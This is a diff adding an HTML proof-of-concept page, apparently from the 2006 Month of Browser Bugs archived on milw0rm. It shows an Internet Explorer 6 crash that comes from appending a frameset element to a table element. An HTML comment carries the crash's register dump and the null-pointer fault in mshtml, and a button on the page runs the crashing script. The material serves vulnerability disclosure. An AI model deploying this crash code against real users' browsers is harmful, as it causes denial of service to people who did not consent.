@@ -1,0 +1,38 @@
+<!--
+http://browserfun.blogspot.com/
+
+The following bug was tested on the latest version of Internet Explorer 6 
+on a fully-patched Windows XP SP2 system. This bug was found by Aviv Raff 
+using the DOM-Hanoi fuzzer script. DOM-Hanoi works by building trees of 
+every combination of elements up to the specifed depth. An alternate PoC 
+could use plain HTML instead of javascript.
+
+var a = document.createElement('table');
+var b = document.createElement('frameset');
+a.appendChild(b);
+
+eax=00000000 ebx=01884710 ecx=01886c60
+edx=00000027 esi=0013aeb0 edi=01884730
+eip=7dc995ad esp=0013ae88 ebp=0013ae9c6
+mshtml!CTreePos::NextTreePos+0x23:
+7dc995ad f60010 test byte ptr [eax],0x10 ds:0023:00000000=??
+
+-->
+
+<html><body><script>
+
+// MoBB Demonstration
+function Demo() {
+	var a = document.createElement('table');
+	var b = document.createElement('frameset');
+	a.appendChild(b);
+}
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
+
+
+</body></html>
+
+# milw0rm.com [2006-07-07]
